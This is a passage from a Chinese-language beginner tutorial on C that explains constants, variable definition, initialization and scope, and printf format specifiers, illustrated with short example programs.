<ul>
<li>小数形式
<ul>
<li>单精度小数:以字母f或字母F结尾。例如:0.0f、1.01f</li>
<li>双精度小数:十进制小数形式。例如:3.14、 6.66</li>
</ul>
</li>
<li>
<ul>
<li>默认就是双精度</li>
<li>可以没有整数位只有小数位。例如: .3、 .6f</li>
</ul>
</li>
<li>指数形式
<ul>
<li>以幂的形式表示, 以字母e或字母E后跟一个10为底的幂数</li>
</ul>
</li>
<li>上过初中的都应该知道科学计数法吧,指数形式的常量就是科学计数法的另一种表 示,比如123000,<em><strong>用科学计数法表示为1.23×10的5次方</strong></em></li>
<li><em><strong>用C语言表示就是1.23e5或1.23E5</strong></em></li>
<li>字母e或字母E后面的指数必须为整数</li>
<li>字母e或字母E前后必须要有数</li>
<li>字母e或字母E前后不能有空格</li>
<li>字符常量
<ul>
<li>字符型常量都是用’’(单引号)括起来的。例如:‘a’、‘b’、‘c’</li>
<li>字符常量的单引号中只能有一个字符</li>
<li>特殊情况: 如果是转义字符,单引号中可以有两个字符。例如:’\n’、’\t’</li>
</ul>
</li>
<li>字符串常量
<ul>
<li>字符型常量都是用&quot;&quot;(双引号)括起来的。例如:“a”、“abc”、“lnj”</li>
<li>系统会自动在字符串常量的末尾加一个字符’\0’作为字符串结束标志</li>
</ul>
</li>
</ul>
<h2 id="什么是变量">什么是变量?</h2>
<ul>
<li>
<p>&quot;量&quot;表示数据。变量，则表示一些不固定的数据，也就是可以改变的数据</p>
</li>
<li>
<p>就好比现实生活中人的身高、体重一样, 随着年龄的增长会不断发生改变, 所以身高、体重就是现实生活中变量的一种体现</p>
</li>
<li>
<p>就好比现实生活中超市的储物格一样, 同一个格子在不同时期不同人使用,格子中存储的物品是可以变化的。张三使用这个格子的时候里面放的可能是尿不湿, 但是李四使用这个格子的时候里面放的可能是面包</p>
</li>
</ul>
<h2 id="如何定义变量">如何定义变量</h2>
<p>格式1: 变量类型 变量名称 ;</p>
<ul>
<li>
<p>为什么要定义变量?</p>
<ul>
<li>任何变量在使用之前，必须先进行定义, 只有定义了变量才会分配存储空间, 才有空间存储数据</li>
</ul>
</li>
<li>
<p>为什么要限定类型?</p>
<ul>
<li>用来约束变量所存放数据的类型。一旦给变量指明了类型，那么这个变量就只能存储这种类型的数据</li>
<li>内存空间极其有限,不同类型的变量占用不同大小的存储空间</li>
</ul>
</li>
<li>
<p>为什么要指定变量名称?</p>
<ul>
<li>存储数据的空间对于我们没有任何意义, 我们需要的是空间中存储的值</li>
<li>只有有了名称, 我们才能获取到空间中的值</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a;
<span class="hljs-type">float</span> b;
<span class="hljs-type">char</span> ch;
</code></pre>
<ul>
<li>格式2:变量类型 变量名称,变量名称;
<ul>
<li>连续定义, 多个变量之间用逗号(,)号隔开</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">int a,b,c;
</code></pre>
<ul>
<li>变量名的命名的规范
<ul>
<li>变量名属于标识符,所以必须严格遵守标识符的命名原则</li>
</ul>
</li>
</ul>
<h2 id="如何使用变量">如何使用变量？</h2>
<ul>
<li>可以利用=号往变量里面存储数据
<ul>
<li>在C语言中,利用=号往变量里面存储数据, 我们称之为给变量赋值</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> value;
value = <span class="hljs-number">998</span>; <span class="hljs-comment">// 赋值</span>
</code></pre>
<p>注意:</p>
<ul>
<li>
<p>这里的=号，并不是数学中的“相等”，而是C语言中的<em><strong>赋值运算符</strong></em>，作用是将右边的整型常量998赋值给左边的整型变量value</p>
</li>
<li>
<ul>
<li>赋值的时候,= 号的左侧必须是变量 (10=b,错误)</li>
<li>为了方便阅读代码, 习惯在 = 的两侧 各加上一个 空格</li>
</ul>
</li>
</ul>
<h2 id="变量的初始化">变量的初始化</h2>
<ul>
<li>C语言中, 变量的第一次赋值，我们称为“初始化”</li>
<li>初始化的两种形式
<ul>
<li>先定义,后初始化</li>
<li><code>int value; value = 998; // 初始化</code></li>
<li>定义时同时初始化</li>
<li><code>int a = 10; int b = 4, c = 2;</code></li>
<li>其它表现形式(不推荐)</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a, b = <span class="hljs-number">10</span>; <span class="hljs-comment">//部分初始化</span>
<span class="hljs-type">int</span> c, d, e;
c = d = e =<span class="hljs-number">0</span>;
</code></pre>
<ul>
<li>不初始化里面存储什么?
<ul>
<li>随机数</li>
<li>上次程序分配的存储空间,存数一些 内容,“垃圾”</li>
<li>系统正在用的一些数据</li>
</ul>
</li>
</ul>
<h2 id="如何修改变量值">如何修改变量值?</h2>
<ul>
<li>多次赋值即可
<ul>
<li>每次赋值都会覆盖原来的值</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> i = <span class="hljs-number">10</span>;
i = <span class="hljs-number">20</span>; <span class="hljs-comment">// 修改变量的值</span>
</code></pre>
<h2 id="变量之间的值传递">变量之间的值传递</h2>
<ul>
<li>可以将一个变量存储的值赋值给另一个变量</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;
<span class="hljs-type">int</span> b = a; <span class="hljs-comment">// 相当于把a中存储的10拷贝了一份给b</span>
</code></pre>
<h2 id="如何查看变量的值">如何查看变量的值?</h2>
<ul>
<li>使用printf输出一个或多个变量的值</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>, c = <span class="hljs-number">11</span>;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a=%d, c=%d&quot;</span>, a, c);
</code></pre>
<p>这里强调一下，有的题让你输出的有无前缀，输出的命令是不一样的，如果输出不做前缀要求那就按照上面的就可以，如果输出要前缀就需要按照下面的（这里举部分例子）</p>
<pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%#o %#d %#x&quot;</span>,a,a,a);<span class="hljs-comment">//带个#就是输出带前缀的意思，o，d。x分别代表八进制，十进制，十六进制</span></code></pre>
<ul>
<li>输出其它类型变量的值</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">double</span> height = <span class="hljs-number">1.75</span>;
<span class="hljs-type">char</span> blood = <span class="hljs-string">&#x27;A&#x27;</span>;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;height=%.2f, 血型是%c&quot;</span>, height,  blood);
</code></pre>
<h2 id="变量的作用域">变量的作用域</h2>
<ul>
<li>
<p>C语言中所有变量都有自己的作用域</p>
</li>
<li>
<p>变量定义的位置不同,其作用域也不同</p>
</li>
<li>
<p>按照作用域的范围可分为两种, 即局部变量和全局变量</p>
</li>
<li>
<p>局部变量</p>
<ul>
<li>局部变量也称为内部变量</li>
<li>局部变量是在<em><strong>代码块内</strong></em>定义的, 其作用域仅限于代码块内, 离开该代码块后无法使用</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> i = <span class="hljs-number">998</span>; <span class="hljs-comment">// 作用域开始</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-comment">// 作用域结束</span>
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    &#123;
        <span class="hljs-type">int</span> i = <span class="hljs-number">998</span>; <span class="hljs-comment">// 作用域开始</span>
    &#125;<span class="hljs-comment">// 作用域结束</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i = %d\n&quot;</span>, i); <span class="hljs-comment">// 不能使用</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    &#123;
        &#123;
            <span class="hljs-type">int</span> i = <span class="hljs-number">998</span>;<span class="hljs-comment">// 作用域开始</span>
        &#125;<span class="hljs-comment">// 作用域结束</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i = %d\n&quot;</span>, i); <span class="hljs-comment">// 不能使用</span>
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>
<ul>
<li>全局变量
<ul>
<li>全局变量也称为外部变量,它是在代码块外部定义的变量</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> i = <span class="hljs-number">666</span>;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i = %d\n&quot;</span>, i); <span class="hljs-comment">// 可以使用</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;<span class="hljs-comment">// 作用域结束</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i = %d\n&quot;</span>, i); <span class="hljs-comment">// 可以使用</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>
<ul>
<li>注意点:
<ul>
<li>同一作用域范围内不能有相同名称的变量</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> i = <span class="hljs-number">998</span>; <span class="hljs-comment">// 作用域开始</span>
    <span class="hljs-type">int</span> i = <span class="hljs-number">666</span>; <span class="hljs-comment">// 报错, 重复定义</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;<span class="hljs-comment">// 作用域结束</span>
</code></pre>
<pre><code class="hljs c"><span class="hljs-type">int</span> i = <span class="hljs-number">666</span>; 
<span class="hljs-type">int</span> i = <span class="hljs-number">998</span>; <span class="hljs-comment">// 报错, 重复定义</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>
<ul>
<li>不同作用域范围内可以有相同名称的变量</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> i = <span class="hljs-number">666</span>; 
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> i = <span class="hljs-number">998</span>; <span class="hljs-comment">// 不会报错</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> i = <span class="hljs-number">998</span>; <span class="hljs-comment">// 不会报错</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
<span class="hljs-type">int</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> i = <span class="hljs-number">666</span>;  <span class="hljs-comment">// 不会报错</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>
<h2 id="变量内存分析简单版">变量内存分析（简单版）</h2>
<ul>
<li>字节和地址
<ul>
<li>为了更好地理解变量在内存中的存储细节，先来认识一下内存中的“字节”和“地址”</li>
<li><em><strong>每一个小格子代表一个字节</strong></em></li>
<li><em><strong>每个字节都有自己的内存地址</strong></em></li>
<li><em><strong>内存地址是连续的</strong></em></li>
</ul>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/img_convert/3ede1dc5da28f1aafdb2b54137569f52.png" alt="img"></p>
<ul>
<li>变量存储占用的空间
<ul>
<li>一个变量所占用的存储空间，和<em><strong>定义变量时声明的类型</strong></em>以及<em><strong>当前编译环境</strong></em>有关</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>类型</strong></th>
<th style="text-align:center"><strong>16位编译器</strong></th>
<th style="text-align:center"><strong>32位编译器</strong></th>
<th style="text-align:center"><strong>64位编译器</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">char</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">int</td>
<td style="text-align:center">2</td>
<td style="text-align:center">4</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">float</td>
<td style="text-align:center">4</td>
<td style="text-align:center">4</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">double</td>
<td style="text-align:center">8</td>
<td style="text-align:center">8</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">short</td>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:center">long</td>
<td style="text-align:center">4</td>
<td style="text-align:center">4</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">long long</td>
<td style="text-align:center">8</td>
<td style="text-align:center">8</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">void*</td>
<td style="text-align:center">2</td>
<td style="text-align:center">4</td>
<td style="text-align:center">8</td>
</tr>
</tbody>
</table>
<p>变量存储的过程</p>
<ul>
<li>根据定义变量时声明的类型和当前编译环境确定需要开辟多大存储空间</li>
<li>在内存中开辟一块存储空间，开辟时从内存地址大的开始开辟（内存寻址从大到小）</li>
<li>将数据保存到已经开辟好的对应内存空间中</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
  <span class="hljs-type">int</span> number;
  <span class="hljs-type">int</span> value;
  number = <span class="hljs-number">22</span>;
  value = <span class="hljs-number">666</span>;
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number;
    <span class="hljs-type">int</span> value;
    number = <span class="hljs-number">22</span>;
    value = <span class="hljs-number">666</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&amp;number = %p\n&quot;</span>, &amp;number); <span class="hljs-comment">// 0060FEAC</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&amp;value = %p\n&quot;</span>, &amp;value);   <span class="hljs-comment">// 0060FEA8</span>
&#125;
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5fbf5c1e7e27f7db67596733e5ce8d28.png" alt="img"></p>
<blockquote>
<p>先不要着急, 刚开始接触C语言, 先了解这么多就够了. 后面会再次更深入的讲述存储的各种细节。</p>
</blockquote>
<h2 id="printf函数">printf函数</h2>
<p><img src="https://img-blog.csdnimg.cn/img_convert/0f82aa8ad2b00d2b717ed8f9237e5cf7.png" alt="img"></p>
<ul>
<li>printf函数称之为格式输出函数,方法名称的最后一个字母f表示format。其功能是按照用户指定的格式,把指定的数据输出到屏幕上</li>
<li>printf函数的调用格式为:
<ul>
<li>printf(“格式控制字符串”,输出项列表 );</li>
<li>例如:printf(“a = %d, b = %d”,a, b);</li>
</ul>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/img_convert/78cc3a0e2d1cab75a6704c2ffb13f63f.png" alt="img"></p>
<ul>
<li>
<p>非格式字符串原样输出, 格式控制字符串会被输出项列表中的数据替换</p>
</li>
<li>
<p>注意: 格式控制字符串和输出项在数量和类型上<em><strong>必须一一对应</strong></em></p>
</li>
<li>
<p>格式控制字符串</p>
<ul>
<li>形式: <code>%[标志][输出宽度][.精度][长度]类型</code></li>
</ul>
</li>
<li>
<p>类型</p>
<ul>
<li>格式: <code>printf(&quot;a = %类型&quot;, a);</code></li>
<li>类型字符串用以表示输出数据的类型, 其格式符和意义如下所示</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>类型</strong></th>
<th style="text-align:center"><strong>含义</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">d</td>
<td style="text-align:center">有符号10进制整型</td>
</tr>
<tr>
<td style="text-align:center">i</td>
<td style="text-align:center">有符号10进制整型</td>
</tr>
<tr>
<td style="text-align:center">u</td>
<td style="text-align:center">无符号10进制整型</td>
</tr>
<tr>
<td style="text-align:center">o</td>
<td style="text-align:center">无符号8进制整型</td>
</tr>
<tr>
<td style="text-align:center">x</td>
<td style="text-align:center">无符号16进制整型</td>
</tr>
<tr>
<td style="text-align:center">X</td>
<td style="text-align:center">无符号16进制整型</td>
</tr>
<tr>
<td style="text-align:center">f</td>
<td style="text-align:center">单、双精度浮点数(默认保留6位小数)</td>
</tr>
<tr>
<td style="text-align:center">e / E</td>
<td style="text-align:center">以指数形式输出单、双精度浮点数</td>
</tr>
<tr>
<td style="text-align:center">g / G</td>
<td style="text-align:center">以最短输出宽度,输出单、双精度浮点数</td>
</tr>
<tr>
<td style="text-align:center">c</td>
<td style="text-align:center">字符</td>
</tr>
<tr>
<td style="text-align:center">s</td>
<td style="text-align:center">字符串</td>
</tr>
<tr>
<td style="text-align:center">p</td>
<td style="text-align:center">地址</td>
</tr>
</tbody>
</table>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;
    <span class="hljs-type">int</span> b = <span class="hljs-number">-10</span>;
    <span class="hljs-type">float</span> c = <span class="hljs-number">6.6f</span>;
    <span class="hljs-type">double</span> d = <span class="hljs-number">3.1415926</span>;
    <span class="hljs-type">double</span> e = <span class="hljs-number">10.10</span>;
    <span class="hljs-type">char</span> f = <span class="hljs-string">&#x27;a&#x27;</span>;
    <span class="hljs-comment">// 有符号整数(可以输出负数)</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>, a); <span class="hljs-comment">// 10</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %i\n&quot;</span>, a); <span class="hljs-comment">// 10</span>

    <span class="hljs-comment">// 无符号整数(不可以输出负数)</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %u\n&quot;</span>, a); <span class="hljs-comment">// 10</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b = %u\n&quot;</span>, b); <span class="hljs-comment">// 429496786</span>

    <span class="hljs-comment">// 无符号八进制整数(不可以输出负数)</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %o\n&quot;</span>, a); <span class="hljs-comment">// 12</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b = %o\n&quot;</span>, b); <span class="hljs-comment">// 37777777766</span>

    <span class="hljs-comment">// 无符号十六进制整数(不可以输出负数)</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %x\n&quot;</span>, a); <span class="hljs-comment">// a</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b = %x\n&quot;</span>, b); <span class="hljs-comment">// fffffff6</span>

    <span class="hljs-comment">// 无符号十六进制整数(不可以输出负数)</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %X\n&quot;</span>, a); <span class="hljs-comment">// A</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b = %X\n&quot;</span>, b); <span class="hljs-comment">// FFFFFFF6</span>

    <span class="hljs-comment">// 单、双精度浮点数(默认保留6位小数)</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c = %f\n&quot;</span>, c); <span class="hljs-comment">// 6.600000</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;d = %lf\n&quot;</span>, d); <span class="hljs-comment">// 3.141593</span>

    <span class="hljs-comment">// 以指数形式输出单、双精度浮点数</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;e = %e\n&quot;</span>, e); <span class="hljs-comment">// 1.010000e+001</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;e = %E\n&quot;</span>, e); <span class="hljs-comment">// 1.010000E+001</span>
    
    <span class="hljs-comment">// 以最短输出宽度,输出单、双精度浮点数</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;e = %g\n&quot;</span>, e); <span class="hljs-comment">// 10.1</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;e = %G\n&quot;</span>, e); <span class="hljs-comment">// 10.1</span>
    
    <span class="hljs-comment">// 输出字符</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;f = %c\n&quot;</span>, f); <span class="hljs-comment">// a</span>
&#125;
</code></pre>
<ul>
<li>宽度
<ul>
<li>格式: <code>printf(&quot;a = %[宽度]类型&quot;, a);</code></li>
<li>用十进制整数来指定输出的宽度, 如果实际位数多于指定宽度,则按照实际位数输出, 如果实际位数少于指定宽度则以空格补位</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-comment">// 实际位数小于指定宽度</span>
    <span class="hljs-type">int</span> a = <span class="hljs-number">1</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a =|%d|\n&quot;</span>, a); <span class="hljs-comment">// |1|</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a =|%5d|\n&quot;</span>, a); <span class="hljs-comment">// |    1|</span>
    <span class="hljs-comment">// 实际位数大于指定宽度</span>
    <span class="hljs-type">int</span> b = <span class="hljs-number">1234567</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b =|%d|\n&quot;</span>, b); <span class="hljs-comment">// |1234567|</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b =|%5d|\n&quot;</span>, b); <span class="hljs-comment">// |1234567|</span>
&#125;
</code></pre>
<ul>
<li>标志
<ul>
<li>格式: <code>printf(&quot;a = %[标志][宽度]类型&quot;, a);</code></li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>标志</strong></th>
<th style="text-align:center"><strong>含义</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-</td>
<td style="text-align:center">左对齐, 默认右对齐</td>
</tr>
<tr>
<td style="text-align:center">+</td>
<td style="text-align:center">当输出值为正数时,在输出值前面加上一个+号, 默认不显示</td>
</tr>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">右对齐时, 用0填充宽度.(默认用空格填充)</td>
</tr>
<tr>
<td style="text-align:center">空格</td>
<td style="text-align:center">输出值为正数时,在输出值前面加上空格, 为负数时加上负号</td>
</tr>
<tr>
<td style="text-align:center">#</td>
<td style="text-align:center">对c、s、d、u类型无影响</td>
</tr>
<tr>
<td style="text-align:center">#</td>
<td style="text-align:center">对o类型, 在输出时加前缀o</td>
</tr>
<tr>
<td style="text-align:center">#</td>
<td style="text-align:center">对x类型,在输出时加前缀0x</td>
</tr>
</tbody>
</table>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> a = <span class="hljs-number">1</span>;
    <span class="hljs-type">int</span> b = <span class="hljs-number">-1</span>;
    <span class="hljs-comment">// -号标志</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a =|%d|\n&quot;</span>, a); <span class="hljs-comment">// |1|</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a =|%5d|\n&quot;</span>, a); <span class="hljs-comment">// |    1|</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a =|%-5d|\n&quot;</span>, a);<span class="hljs-comment">// |1    |</span>
    <span class="hljs-comment">// +号标志</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a =|%d|\n&quot;</span>, a); <span class="hljs-comment">// |1|</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a =|%+d|\n&quot;</span>, a);<span class="hljs-comment">// |+1|</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b =|%d|\n&quot;</span>, b); <span class="hljs-comment">// |-1|</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b =|%+d|\n&quot;</span>, b);<span class="hljs-comment">// |-1|</span>
    <span class="hljs-comment">// 0标志</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a =|%5d|\n&quot;</span>, a); <span class="hljs-comment">// |    1|</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a =|%05d|\n&quot;</span>, a); <span class="hljs-comment">// |00001|</span>
    <span class="hljs-comment">// 空格标志</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a =|% d|\n&quot;</span>, a); <span class="hljs-comment">// | 1|</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b =|% d|\n&quot;</span>, b); <span class="hljs-comment">// |-1|</span>
    <span class="hljs-comment">// #号</span>
    <span class="hljs-type">int</span> c = <span class="hljs-number">10</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c = %o\n&quot;</span>, c); <span class="hljs-comment">// 12</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c = %#o\n&quot;</span>, c); <span class="hljs-comment">// 012</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c = %x\n&quot;</span>, c); <span class="hljs-comment">// a</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c = %#x\n&quot;</span>, c); <span class="hljs-comment">// 0xa</span>
&#125;
</code></pre>
<ul>
<li>精度
<ul>
<li>格式: <code>printf(&quot;a = %[精度]类型&quot;, a);</code></li>
<li>精度格式符以&quot;.&quot;开头, 后面跟上十进制整数, 用于指定需要输出多少位小数, 如果输出位数大于指定的精度, 则删除超出的部分</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">double</span> a = <span class="hljs-number">3.1415926</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %.2f\n&quot;</span>, a); <span class="hljs-comment">// 3.14</span>
&#125;
</code></pre>
<ul>
<li>动态指定保留小数位数
<ul>
<li>格式: <code>printf(&quot;a = %.*f&quot;, a);</code></li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">double</span> a = <span class="hljs-number">3.1415926</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %.*f&quot;</span>, <span class="hljs-number">2</span>, a); <span class="hljs-comment">// 3.14</span>
&#125;
</code></pre>
<ul>
<li>实型(浮点类型)有效位数问题
<ul>
<li>对于单精度数,使用%f格式符输出时,仅前6~7位是有效数字</li>
<li>对于双精度数,使用%lf格式符输出时,前15~16位是有效数字</li>
<li>有效位数和精度(保留多少位)不同, 有效位数是指从第一个非零数字开始,误差不超过本数位半个单位的、精确可信的数位</li>
<li>有效位数包含小数点前的非零数位</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-comment">//        1234.567871093750000</span>
    <span class="hljs-type">float</span> a = <span class="hljs-number">1234.567890123456789</span>;
    <span class="hljs-comment">//         1234.567890123456900</span>
    <span class="hljs-type">double</span> b = <span class="hljs-number">1234.567890123456789</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %.15f\n&quot;</span>, a); <span class="hljs-comment">// 前8位数字是准确的, 后面的都不准确</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b = %.15f\n&quot;</span>, b); <span class="hljs-comment">// 前16位数字是准确的, 后面的都不准确</span>
&#125;
</code></pre>
<ul>
<li>长度
<ul>
<li>格式: <code>printf(&quot;a = %[长度]类型&quot;, a);</code></li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>长度</strong></th>
<th style="text-align:center"><strong>修饰类型</strong></th>
<th style="text-align:center"><strong>含义</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">hh</td>
<td style="text-align:center">d、i、o、u、x</td>
<td style="text-align:center">输出char</td>
</tr>
<tr>
<td style="text-align:center">h</td>
<td style="text-align:center">d、i、o、u、x</td>
<td style="text-align:center">输出 short int</td>
</tr>
<tr>
<td style="text-align:center">l</td>
<td style="text-align:center">d、i、o、u、x</td>
<td style="text-align:center">输出 long int</td>
</tr>
<tr>
<td style="text-align:center">ll</td>
<td style="text-align:center">d、i、o、u、x</td>
<td style="text-align:center">输出 long long int</td>
</tr>
</tbody>
</table>
